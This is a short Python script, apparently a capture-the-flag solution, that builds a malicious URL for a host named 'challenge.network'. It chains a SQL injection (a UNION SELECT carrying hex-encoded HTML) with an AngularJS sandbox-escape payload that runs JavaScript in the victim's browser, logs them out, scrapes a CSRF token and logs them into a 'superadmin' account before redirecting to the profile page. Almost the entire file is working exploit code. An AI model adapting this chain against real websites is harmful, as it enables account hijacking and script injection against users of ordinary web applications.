from binascii import hexlify
import re

# CONFIGURATION #
host = 'challenge.network'
script = \
"""
if (typeof window.run === "undefined") {
    window.run = true;
    var csrfReg = /\"csrfToken\" value=\"(.*)\"/;
    $.ajax({
        cache: false,
        method: "GET",
        url: "/logout"
    }).then(() => {
        $.ajax({
            cache: false,
            method: "GET",
            url: "/login"
        }).then(data => {
            let match = data.match(csrfReg);
            console.log(match);
            return match[1]
        }).then(csrfToken => {
            $.ajax({
                cache: false,
                method: "POST",
                url: "/login",
                data: {
                    csrfToken: csrfToken,
                    username: "superadmin",
                    password: "hunter2"
                }
            }).then(() => {
                window.location.replace("/update-profile");
            });
        });
    });
}
"""
post_id = '96IStw2DFyA9eq_FXf0QsLXvFZs6EMzZ'


# IGNORE THIS PART #
script = script.strip()
injection = \
"""
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.7.8/angular.min.js"></script>
<div ng-app ng-csp>
{{{{constructor.constructor('{0}')()}}}}
</div>
""".format(script).encode('utf-8')
payload = hexlify(injection)
payload = re.sub(' ', '%20', '\' UNION SELECT \'1\', \'1\', encode(decode({},\'hex\'),\'escape\') --'.format(payload))
# lazy me
payload = re.sub(r'decode\(b\'', 'decode(\'', payload)
URL = 'https://{}/post/{}{}'.format(host, post_id, payload)
print(URL)